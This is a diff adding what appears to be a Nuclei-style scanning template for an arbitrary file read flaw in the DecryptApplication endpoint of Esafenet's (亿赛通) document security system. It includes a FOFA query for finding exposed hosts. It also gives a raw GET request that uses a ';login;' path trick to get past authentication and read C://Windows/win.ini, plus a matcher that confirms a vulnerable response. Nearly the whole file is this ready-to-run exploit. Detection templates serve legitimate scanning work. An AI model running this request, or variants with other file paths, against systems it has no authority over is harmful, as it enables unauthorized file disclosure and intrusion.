@@ -1,0 +1,26 @@
+id: esafenet-decryptapplication-file-read
+
+info:
+  name: "亿赛通电子文档安全管理系统DecryptApplication接口任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="亿赛通-电子文档安全管理系统"||body="/CDGServer3/index.jsp"
+          该系统提供数据泄露防护功能，专注于防止数据在共享和存储过程中被非法访问或窃取。其DecryptApplication接口因未正确校验文件访问权限，导致攻击者可通过构造特定请求读取任意文件内容。
+  tags: 亿赛通
+
+http:
+- raw:
+  - |
+    GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
